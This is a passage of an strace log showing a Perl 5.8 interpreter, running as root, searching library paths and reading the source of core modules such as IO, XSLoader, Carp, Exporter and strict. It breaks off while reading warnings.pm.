9764  07:29:45.350581 brk(0x8174000)    = 0x8174000
9764  07:29:45.350623 getuid32()        = 0
9764  07:29:45.350633 geteuid32()       = 0
9764  07:29:45.350642 getgid32()        = 0
9764  07:29:45.350651 getegid32()       = 0
9764  07:29:45.350688 mmap2(NULL, 135168, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7dab000
9764  07:29:45.350716 open("/dev/urandom", O_RDONLY|O_LARGEFILE) = 1
9764  07:29:45.350733 read(1, " 5:\244", 4) = 4
9764  07:29:45.350746 close(1)          = 0
9764  07:29:45.350763 time(NULL)        = 1495625385
9764  07:29:45.350864 stat64("/usr/local/lib/site_perl/5.8.8/i486-linux-gnu-thread-multi", 0xbffa3910) = -1 ENOENT (No such file or directory)
9764  07:29:45.350900 stat64("/usr/local/lib/site_perl/5.8.8", 0xbffa3910) = -1 ENOENT (No such file or directory)
9764  07:29:45.350912 stat64("/usr/local/lib/site_perl/i486-linux-gnu-thread-multi", 0xbffa3910) = -1 ENOENT (No such file or directory)
9764  07:29:45.350928 stat64("/usr/local/lib/perl/5.8.7", 0xbffa3a50) = -1 ENOENT (No such file or directory)
9764  07:29:45.350940 stat64("/usr/local/share/perl/5.8.7", 0xbffa3a50) = -1 ENOENT (No such file or directory)
9764  07:29:45.350952 stat64("/usr/local/lib/perl/5.8.6", 0xbffa3a50) = -1 ENOENT (No such file or directory)
9764  07:29:45.350963 stat64("/usr/local/share/perl/5.8.6", 0xbffa3a50) = -1 ENOENT (No such file or directory)
9764  07:29:45.350975 stat64("/usr/local/lib/perl/5.8.4", 0xbffa3a50) = -1 ENOENT (No such file or directory)
9764  07:29:45.350986 stat64("/usr/local/share/perl/5.8.4", 0xbffa3a50) = -1 ENOENT (No such file or directory)
9764  07:29:45.350998 stat64("/usr/local/lib/perl/5.8.3", 0xbffa3a50) = -1 ENOENT (No such file or directory)
9764  07:29:45.351009 stat64("/usr/local/share/perl/5.8.3", 0xbffa3a50) = -1 ENOENT (No such file or directory)
9764  07:29:45.351021 stat64("/usr/local/lib/perl/5.8.2", 0xbffa3a50) = -1 ENOENT (No such file or directory)
9764  07:29:45.358325 stat64("/usr/local/share/perl/5.8.2", 0xbffa3a50) = -1 ENOENT (No such file or directory)
9764  07:29:45.358369 stat64("/usr/local/lib/perl/5.8.1", 0xbffa3a50) = -1 ENOENT (No such file or directory)
9764  07:29:45.358381 stat64("/usr/local/share/perl/5.8.1", 0xbffa3a50) = -1 ENOENT (No such file or directory)
9764  07:29:45.358410 stat64("/usr/local/lib/perl/5.8.0", 0xbffa3a50) = -1 ENOENT (No such file or directory)
9764  07:29:45.358421 stat64("/usr/local/share/perl/5.8.0", 0xbffa3a50) = -1 ENOENT (No such file or directory)
9764  07:29:45.358445 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa3748) = -1 ENOTTY (Inappropriate ioctl for device)
9764  07:29:45.358458 _llseek(0, 0, [0], SEEK_CUR) = 0
9764  07:29:45.358470 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa3748) = -1 EBADF (Bad file descriptor)
9764  07:29:45.358484 _llseek(1, 0, 0xbffa3790, SEEK_CUR) = -1 EBADF (Bad file descriptor)
9764  07:29:45.358495 ioctl(2, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa3748) = -1 EINVAL (Invalid argument)
9764  07:29:45.358506 _llseek(2, 0, 0xbffa3790, SEEK_CUR) = -1 ESPIPE (Illegal seek)
9764  07:29:45.358516 open("/dev/null", O_RDONLY|O_LARGEFILE) = 1
9764  07:29:45.358529 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa3808) = -1 ENOTTY (Inappropriate ioctl for device)
9764  07:29:45.358539 _llseek(1, 0, [0], SEEK_CUR) = 0
9764  07:29:45.358551 fcntl64(1, F_SETFD, FD_CLOEXEC) = 0
9764  07:29:45.358562 fstat64(1, {st_mode=S_IFCHR|0666, st_rdev=makedev(1, 3), ...}) = 0
9764  07:29:45.358581 rt_sigaction(SIGCHLD, NULL, {SIG_DFL}, 8) = 0
9764  07:29:45.358634 readlink("/proc/self/exe", "/usr/bin/perl", 4095) = 13
9764  07:29:45.358678 getppid()         = 9762
9764  07:29:45.358737 stat64("/etc/perl/IO.pmc",  <unfinished ...>
4519  07:29:45.358749 waitpid(9762,  <unfinished ...>
9764  07:29:45.358760 <... stat64 resumed> 0xbffa34fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.358767 stat64("/etc/perl/IO.pm", 0xbffa340c) = -1 ENOENT (No such file or directory)
9764  07:29:45.358780 stat64("/usr/local/lib/perl/5.8.8/IO.pmc", 0xbffa34fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.358793 stat64("/usr/local/lib/perl/5.8.8/IO.pm", 0xbffa340c) = -1 ENOENT (No such file or directory)
9764  07:29:45.358818 stat64("/usr/local/share/perl/5.8.8/IO.pmc", 0xbffa34fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.358860 stat64("/usr/local/share/perl/5.8.8/IO.pm", 0xbffa340c) = -1 ENOENT (No such file or directory)
9764  07:29:45.358874 stat64("/usr/lib/perl5/IO.pmc", 0xbffa34fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.358903 stat64("/usr/lib/perl5/IO.pm", 0xbffa340c) = -1 ENOENT (No such file or directory)
9764  07:29:45.358915 stat64("/usr/share/perl5/IO.pmc", 0xbffa34fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.358927 stat64("/usr/share/perl5/IO.pm", 0xbffa340c) = -1 ENOENT (No such file or directory)
9764  07:29:45.358940 stat64("/usr/lib/perl/5.8/IO.pmc", 0xbffa34fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.358953 stat64("/usr/lib/perl/5.8/IO.pm", {st_mode=S_IFREG|0644, st_size=413, ...}) = 0
9764  07:29:45.358973 open("/usr/lib/perl/5.8/IO.pm", O_RDONLY|O_LARGEFILE) = 6
9764  07:29:45.358986 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa3218) = -1 ENOTTY (Inappropriate ioctl for device)
9764  07:29:45.358997 _llseek(6, 0, [0], SEEK_CUR) = 0
9764  07:29:45.359020 read(6, "#\n\npackage IO;\n\nuse XSLoader ();\nuse Carp;\nuse strict;\nuse warnings;\n\nour $VERSION = \"1.22\";\nXSLoader::load \'IO\', $VERSION;\n\nsub import {\n    shift;\n\n    warnings::warnif(\'deprecated\', qq{Parameterless \"use IO\" deprecated})\n        if @_ == 0 ;\n    \n    my @l = @_ ? @_ : qw(Handle Seekable File Pipe Socket Dir);\n\n    eval join(\"\", map { \"require IO::\" . (/(\\w+)/)[0] . \";\\n\" } @l)\n\tor croak $@;\n}\n\n1;\n\n__END__\n\n", 4096) = 413
9764  07:29:45.359076 stat64("/etc/perl/XSLoader.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.359089 stat64("/etc/perl/XSLoader.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.359102 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.359115 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.359128 stat64("/usr/local/share/perl/5.8.8/XSLoader.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.359141 stat64("/usr/local/share/perl/5.8.8/XSLoader.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.359155 stat64("/usr/lib/perl5/XSLoader.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.359167 stat64("/usr/lib/perl5/XSLoader.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.359180 stat64("/usr/share/perl5/XSLoader.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.359198 stat64("/usr/share/perl5/XSLoader.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.359211 stat64("/usr/lib/perl/5.8/XSLoader.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.359224 stat64("/usr/lib/perl/5.8/XSLoader.pm", {st_mode=S_IFREG|0644, st_size=3408, ...}) = 0
9764  07:29:45.359244 open("/usr/lib/perl/5.8/XSLoader.pm", O_RDONLY|O_LARGEFILE) = 8
9764  07:29:45.359257 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa2d68) = -1 ENOTTY (Inappropriate ioctl for device)
9764  07:29:45.359268 _llseek(8, 0, [0], SEEK_CUR) = 0
9764  07:29:45.359285 read(8, "# Generated from XSLoader.pm.PL (resolved %Config::Config value)\n\npackage XSLoader;\n\n$VERSION = \"0.06\";\n\n#use strict;\n\n# enable debug/trace messages from DynaLoader perl code\n# $dl_debug = $ENV{PERL_DL_DEBUG} || 0 unless defined $dl_debug;\n\n  my $dl_dlext = \'so\';\n\npackage DynaLoader;\n\n# No prizes for guessing why we don\'t say \'bootstrap DynaLoader;\' here.\n# NOTE: All dl_*.xs (including dl_none.xs) define a dl_error() XSUB\nboot_DynaLoader(\'DynaLoader\') if defined(&boot_DynaLoader) &&\n                                !defined(&dl_error);\npackage XSLoader;\n\nsub load {\n    package DynaLoader;\n\n    die q{XSLoader::load(\'Your::Module\', $Your::Module::VERSION)} unless @_;\n\n    my($module) = $_[0];\n\n    # work with static linking too\n    my $b = \"$module\\::bootstrap\";\n    goto &$b if defined &$b;\n\n    goto retry unless $module and defined &dl_load_file;\n\n    my @modparts = split(/::/,$module);\n    my $modfname = $modparts[-1];\n\n    my $modpname = join(\'/\',@modparts);\n    my $modlibname = (caller())[1];\n    my $c = @modparts;\n    $modlibname =~ s,[\\\\/][^\\\\/]+$,, while $c--;\t# Q&D basename\n    my $file = \"$modlibname/auto/$modpname/$modfname.$dl_dlext\";\n\n#   print STDERR \"XSLoader::load for $module ($file)\\n\" if $dl_debug;\n\n    my $bs = $file;\n    $bs =~ s/(\\.\\w+)?(;\\d*)?$/\\.bs/; # look for .bs \'beside\' the library\n\n    goto retry if not -f $file or -s $bs;\n\n    my $bootname = \"boot_$module\";\n    $bootname =~ s/\\W/_/g;\n    @DynaLoader::dl_require_symbols = ($bootname);\n\n    my $boot_symbol_ref;\n\n    if ($^O eq \'darwin\') {\n        if ($boot_symbol_ref = dl_find_symbol(0, $bootname)) {\n            goto boot; #extension library has already been loaded, e.g. darwin\n        }\n    }\n\n    # Many dynamic extension loading problems will appear to come from\n    # this section of code: XYZ failed at line 123 of DynaLoader.pm.\n    # Often these errors are actually occurring in the initialisation\n    # C code of the extension XS file. Perl reports the error as being\n    # in this perl code simply because this was the last perl code\n    # it executed.\n\n    my $libref = dl_load_file($file, 0) or do { \n        require Carp;\n        Carp::croak(\"Can\'t load \'$file\' for module $module: \" . dl_error());\n    };\n    push(@DynaLoader::dl_librefs,$libref);  # record loaded object\n\n    my @unresolved = dl_undef_symbols();\n    if (@unresolved) {\n        require Carp;\n        Carp::carp(\"Undefined symbols present after loading $file: @unresolved\\n\");\n    }\n\n    $boot_symbol_ref = dl_find_symbol($libref, $bootname) or do {\n        require Carp;\n        Carp::croak(\"Can\'t find \'$bootname\' symbol in $file\\n\");\n    };\n\n    push(@DynaLoader::dl_modules, $module); # record loaded module\n\n  boot:\n    my $xs = dl_install_xsub(\"${module}::bootstrap\", $boot_symbol_ref, $file);\n\n    # See comment block above\n    return &$xs(@_);\n\n  retry:\n    my $bootstrap_inherit = DynaLoader->can(\'bootstrap_inherit\') || \n                            XSLoader->can(\'bootstrap_inherit\');\n    goto &$bootstrap_inherit;\n}\n\n# Versions of DynaLoader prior to 5.6.0 don\'t have this function.\nsub bootstrap_inherit {\n    package DynaLoader;\n\n    my $module = $_[0];\n    local *DynaLoader::isa = *{\"$module\\::ISA\"};\n    local @DynaLoader::isa = (@DynaLoader::isa, \'DynaLoader\');\n    # Cannot goto due to delocalization.  Will report errors on a wrong line?\n    require DynaLoader;\n    DynaLoader::bootstrap(@_);\n}\n\n1;\n\n__END__\n\n", 4096) = 3408
9764  07:29:45.359575 brk(0x8195000)    = 0x8195000
9764  07:29:45.359920 _llseek(8, 3407, [3407], SEEK_SET) = 0
9764  07:29:45.359938 _llseek(8, 0, [3407], SEEK_CUR) = 0
9764  07:29:45.359949 close(8)          = 0
9764  07:29:45.359993 stat64("/etc/perl/Carp.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.360009 stat64("/etc/perl/Carp.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.360022 stat64("/usr/local/lib/perl/5.8.8/Carp.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.360034 stat64("/usr/local/lib/perl/5.8.8/Carp.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.360048 stat64("/usr/local/share/perl/5.8.8/Carp.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.360061 stat64("/usr/local/share/perl/5.8.8/Carp.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.360074 stat64("/usr/lib/perl5/Carp.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.360086 stat64("/usr/lib/perl5/Carp.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.360099 stat64("/usr/share/perl5/Carp.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.360110 stat64("/usr/share/perl5/Carp.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.360123 stat64("/usr/lib/perl/5.8/Carp.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.360136 stat64("/usr/lib/perl/5.8/Carp.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.360149 stat64("/usr/share/perl/5.8/Carp.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.360162 stat64("/usr/share/perl/5.8/Carp.pm", {st_mode=S_IFREG|0644, st_size=4112, ...}) = 0
9764  07:29:45.360182 open("/usr/share/perl/5.8/Carp.pm", O_RDONLY|O_LARGEFILE) = 8
9764  07:29:45.360196 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa2d68) = -1 ENOTTY (Inappropriate ioctl for device)
9764  07:29:45.360208 _llseek(8, 0, [0], SEEK_CUR) = 0
9764  07:29:45.360224 read(8, "package Carp;\n\nour $VERSION = \'1.04\';\n\n# This package is heavily used. Be small. Be fast. Be good.\n\n# Comments added by Andy Wardley <abw@kfs.org> 09-Apr-98, based on an\n# _almost_ complete understanding of the package.  Corrections and\n# comments are welcome.\n\n# The members of %Internal are packages that are internal to perl.\n# Carp will not report errors from within these packages if it\n# can.  The members of %CarpInternal are internal to Perl\'s warning\n# system.  Carp will not report errors from within these packages\n# either, and will not report calls *to* these packages for carp and\n# croak.  They replace $CarpLevel, which is deprecated.    The\n# $Max(EvalLen|(Arg(Len|Nums)) variables are used to specify how the eval\n# text and function arguments should be formatted when printed.\n\n# Comments added by Jos I. Boumans <kane@dwim.org> 11-Aug-2004\n# I can not get %CarpInternal or %Internal to work as advertised,\n# therefor leaving it out of the below documentation.\n# $CarpLevel may be decprecated according to the last comment, but\n# after 6 years, it\'s still around and in heavy use ;)\n\n$CarpInternal{Carp}++;\n$CarpInternal{warnings}++;\n$CarpLevel = 0;     # How many extra package levels to skip on carp.\n                    # How many calls to skip on confess.\n                    # Reconciling these notions is hard, use\n                    # %Internal and %CarpInternal instead.\n$MaxEvalLen = 0;    # How much eval \'...text...\' to show. 0 = all.\n$MaxArgLen = 64;    # How much of each argument to print. 0 = all.\n$MaxArgNums = 8;    # How many arguments to print. 0 = all.\n$Verbose = 0;       # If true then make shortmess call longmess instead\n\nrequire Exporter;\n@ISA = (\'Exporter\');\n@EXPORT = qw(confess croak carp);\n@EXPORT_OK = qw(cluck verbose longmess shortmess);\n@EXPORT_FAIL = qw(verbose);\t# hook to enable verbose mode\n\n# if the caller specifies verbose usage (\"perl -MCarp=verbose script.pl\")\n# then the following method will be called by the Exporter which knows\n# to do this thanks to @EXPORT_FAIL, above.  $_[1] will contain the word\n# \'verbose\'.\n\nsub export_fail {\n    shift;\n    $Verbose = shift if $_[0] eq \'verbose\';\n    return @_;\n}\n\n# longmess() crawls all the way up the stack reporting on all the function\n# calls made.  The error string, $error, is originally constructed from the\n# arguments passed into longmess() via confess(), cluck() or shortmess().\n# This gets appended with the stack trace messages which are generated for\n# each function call on the stack.\n\nsub longmess {\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    if ($Internal{$call_pack} or $CarpInternal{$call_pack}) {\n      return longmess_heavy(@_);\n    }\n    else {\n      local $CarpLevel = $CarpLevel + 1;\n      return longmess_heavy(@_);\n    }\n}\n\n# shortmess() is called by carp() and croak() to skip all the way up to\n# the top-level caller\'s package and report the error from there.  confess()\n# and cluck() generate a full stack trace so they call longmess() to\n# generate that.  In verbose mode shortmess() calls longmess() so\n# you always get a stack trace\n\nsub shortmess {\t# Short-circuit &longmess if called via multiple packages\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    local @CARP_NOT = caller();\n    shortmess_heavy(@_);\n}\n\n# the following four functions call longmess() or shortmess() depending on\n# whether they should generate a full stack trace (confess() and cluck())\n# or simply report the caller\'s package (croak() and carp()), respectively.\n# confess() and croak() die, carp() and cluck() warn.\n\nsub croak   { die  shortmess @_ }\nsub confess { die  longmess  @_ }\nsub carp    { warn shortmess @_ }\nsub cluck   { warn lon", 4096) = 4096
9764  07:29:45.360744 read(8, "gmess  @_ }\n\n1;\n", 4096) = 16
9764  07:29:45.360784 read(8, "", 4096) = 0
9764  07:29:45.360819 close(8)          = 0
9764  07:29:45.360858 stat64("/etc/perl/Exporter.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.360872 stat64("/etc/perl/Exporter.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.360886 stat64("/usr/local/lib/perl/5.8.8/Exporter.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.360899 stat64("/usr/local/lib/perl/5.8.8/Exporter.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.360913 stat64("/usr/local/share/perl/5.8.8/Exporter.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.360926 stat64("/usr/local/share/perl/5.8.8/Exporter.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.360940 stat64("/usr/lib/perl5/Exporter.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.360951 stat64("/usr/lib/perl5/Exporter.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.360964 stat64("/usr/share/perl5/Exporter.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.360976 stat64("/usr/share/perl5/Exporter.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.360989 stat64("/usr/lib/perl/5.8/Exporter.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.361002 stat64("/usr/lib/perl/5.8/Exporter.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.361015 stat64("/usr/share/perl/5.8/Exporter.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.361028 stat64("/usr/share/perl/5.8/Exporter.pm", {st_mode=S_IFREG|0644, st_size=2218, ...}) = 0
9764  07:29:45.361053 open("/usr/share/perl/5.8/Exporter.pm", O_RDONLY|O_LARGEFILE) = 8
9764  07:29:45.361067 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa2d68) = -1 ENOTTY (Inappropriate ioctl for device)
9764  07:29:45.361079 _llseek(8, 0, [0], SEEK_CUR) = 0
9764  07:29:45.361095 read(8, "package Exporter;\n\nrequire 5.006;\n\n# Be lean.\n#use strict;\n#no strict \'refs\';\n\nour $Debug = 0;\nour $ExportLevel = 0;\nour $Verbose ||= 0;\nour $VERSION = \'5.58\';\nour (%Cache);\n$Carp::Internal{Exporter} = 1;\n\nsub as_heavy {\n  require Exporter::Heavy;\n  # Unfortunately, this does not work if the caller is aliased as *name = \\&foo\n  # Thus the need to create a lot of identical subroutines\n  my $c = (caller(1))[3];\n  $c =~ s/.*:://;\n  \\&{\"Exporter::Heavy::heavy_$c\"};\n}\n\nsub export {\n  goto &{as_heavy()};\n}\n\nsub import {\n  my $pkg = shift;\n  my $callpkg = caller($ExportLevel);\n\n  if ($pkg eq \"Exporter\" and @_ and $_[0] eq \"import\") {\n    *{$callpkg.\"::import\"} = \\&import;\n    return;\n  }\n\n  # We *need* to treat @{\"$pkg\\::EXPORT_FAIL\"} since Carp uses it :-(\n  my($exports, $fail) = (\\@{\"$pkg\\::EXPORT\"}, \\@{\"$pkg\\::EXPORT_FAIL\"});\n  return export $pkg, $callpkg, @_\n    if $Verbose or $Debug or @$fail > 1;\n  my $export_cache = ($Cache{$pkg} ||= {});\n  my $args = @_ or @_ = @$exports;\n\n  local $_;\n  if ($args and not %$export_cache) {\n    s/^&//, $export_cache->{$_} = 1\n      foreach (@$exports, @{\"$pkg\\::EXPORT_OK\"});\n  }\n  my $heavy;\n  # Try very hard not to use {} and hence have to  enter scope on the foreach\n  # We bomb out of the loop with last as soon as heavy is set.\n  if ($args or $fail) {\n    ($heavy = (/\\W/ or $args and not exists $export_cache->{$_}\n               or @$fail and $_ eq $fail->[0])) and last\n                 foreach (@_);\n  } else {\n    ($heavy = /\\W/) and last\n      foreach (@_);\n  }\n  return export $pkg, $callpkg, ($args ? @_ : ()) if $heavy;\n  local $SIG{__WARN__} = \n\tsub {require Carp; &Carp::carp};\n  # shortcut for the common case of no type character\n  *{\"$callpkg\\::$_\"} = \\&{\"$pkg\\::$_\"} foreach @_;\n}\n\n# Default methods\n\nsub export_fail {\n    my $self = shift;\n    @_;\n}\n\n# Unfortunately, caller(1)[3] \"does not work\" if the caller is aliased as\n# *name = \\&foo.  Thus the need to create a lot of identical subroutines\n# Otherwise we could have aliased them to export().\n\nsub export_to_level {\n  goto &{as_heavy()};\n}\n\nsub export_tags {\n  goto &{as_heavy()};\n}\n\nsub export_ok_tags {\n  goto &{as_heavy()};\n}\n\nsub require_version {\n  goto &{as_heavy()};\n}\n\n1;\n__END__\n\n", 4096) = 2218
9764  07:29:45.361695 _llseek(8, 2217, [2217], SEEK_SET) = 0
9764  07:29:45.361717 _llseek(8, 0, [2217], SEEK_CUR) = 0
9764  07:29:45.361731 close(8)          = 0
9764  07:29:45.361901 stat64("/etc/perl/strict.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.361924 stat64("/etc/perl/strict.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.361942 stat64("/usr/local/lib/perl/5.8.8/strict.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.361960 stat64("/usr/local/lib/perl/5.8.8/strict.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.361979 stat64("/usr/local/share/perl/5.8.8/strict.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.361996 stat64("/usr/local/share/perl/5.8.8/strict.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.362011 stat64("/usr/lib/perl5/strict.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.362023 stat64("/usr/lib/perl5/strict.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.362036 stat64("/usr/share/perl5/strict.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.362048 stat64("/usr/share/perl5/strict.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.362061 stat64("/usr/lib/perl/5.8/strict.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.362078 stat64("/usr/lib/perl/5.8/strict.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.362092 stat64("/usr/share/perl/5.8/strict.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.362104 stat64("/usr/share/perl/5.8/strict.pm", {st_mode=S_IFREG|0644, st_size=599, ...}) = 0
9764  07:29:45.362125 open("/usr/share/perl/5.8/strict.pm", O_RDONLY|O_LARGEFILE) = 8
9764  07:29:45.362139 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa2d68) = -1 ENOTTY (Inappropriate ioctl for device)
9764  07:29:45.362150 _llseek(8, 0, [0], SEEK_CUR) = 0
9764  07:29:45.362170 read(8, "package strict;\n\n$strict::VERSION = \"1.03\";\n\nmy %bitmask = (\nrefs => 0x00000002,\nsubs => 0x00000200,\nvars => 0x00000400\n);\n\nsub bits {\n    my $bits = 0;\n    my @wrong;\n    foreach my $s (@_) {\n\tpush @wrong, $s unless exists $bitmask{$s};\n        $bits |= $bitmask{$s} || 0;\n    }\n    if (@wrong) {\n        require Carp;\n        Carp::croak(\"Unknown \'strict\' tag(s) \'@wrong\'\");\n    }\n    $bits;\n}\n\nmy $default_bits = bits(qw(refs subs vars));\n\nsub import {\n    shift;\n    $^H |= @_ ? bits(@_) : $default_bits;\n}\n\nsub unimport {\n    shift;\n    $^H &= ~ (@_ ? bits(@_) : $default_bits);\n}\n\n1;\n__END__\n\n", 4096) = 599
9764  07:29:45.362439 _llseek(8, 598, [598], SEEK_SET) = 0
9764  07:29:45.362455 _llseek(8, 0, [598], SEEK_CUR) = 0
9764  07:29:45.362465 close(8)          = 0
9764  07:29:45.362503 stat64("/etc/perl/warnings.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.362517 stat64("/etc/perl/warnings.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.362531 stat64("/usr/local/lib/perl/5.8.8/warnings.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.362543 stat64("/usr/local/lib/perl/5.8.8/warnings.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.362557 stat64("/usr/local/share/perl/5.8.8/warnings.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.362570 stat64("/usr/local/share/perl/5.8.8/warnings.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.362583 stat64("/usr/lib/perl5/warnings.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.362595 stat64("/usr/lib/perl5/warnings.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.362608 stat64("/usr/share/perl5/warnings.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.362620 stat64("/usr/share/perl5/warnings.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.362633 stat64("/usr/lib/perl/5.8/warnings.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.362646 stat64("/usr/lib/perl/5.8/warnings.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.362659 stat64("/usr/share/perl/5.8/warnings.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.362672 stat64("/usr/share/perl/5.8/warnings.pm", {st_mode=S_IFREG|0644, st_size=13018, ...}) = 0
9764  07:29:45.362692 open("/usr/share/perl/5.8/warnings.pm", O_RDONLY|O_LARGEFILE) = 8
9764  07:29:45.362706 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa2d68) = -1 ENOTTY (Inappropriate ioctl for device)
9764  07:29:45.362718 _llseek(8, 0, [0], SEEK_CUR) = 0
9764  07:29:45.362736 read(8, "# -*- buffer-read-only: t -*-\n# !!!!!!!   DO NOT EDIT THIS FILE   !!!!!!!\n# This file was created by warnings.pl\n# Any changes made here will be lost.\n#\n\npackage warnings;\n\nour $VERSION = \'1.05\';\n\nuse Carp ();\n\nour %Offsets = (\n\n    # Warnings Categories added in Perl 5.008\n\n    \'all\'\t\t=> 0,\n    \'closure\'\t\t=> 2,\n    \'deprecated\'\t=> 4,\n    \'exiting\'\t\t=> 6,\n    \'glob\'\t\t=> 8,\n    \'io\'\t\t=> 10,\n    \'closed\'\t\t=> 12,\n    \'exec\'\t\t=> 14,\n    \'layer\'\t\t=> 16,\n    \'newline\'\t\t=> 18,\n    \'pipe\'\t\t=> 20,\n    \'unopened\'\t\t=> 22,\n    \'misc\'\t\t=> 24,\n    \'numeric\'\t\t=> 26,\n    \'once\'\t\t=> 28,\n    \'overflow\'\t\t=> 30,\n    \'pack\'\t\t=> 32,\n    \'portable\'\t\t=> 34,\n    \'recursion\'\t\t=> 36,\n    \'redefine\'\t\t=> 38,\n    \'regexp\'\t\t=> 40,\n    \'severe\'\t\t=> 42,\n    \'debugging\'\t\t=> 44,\n    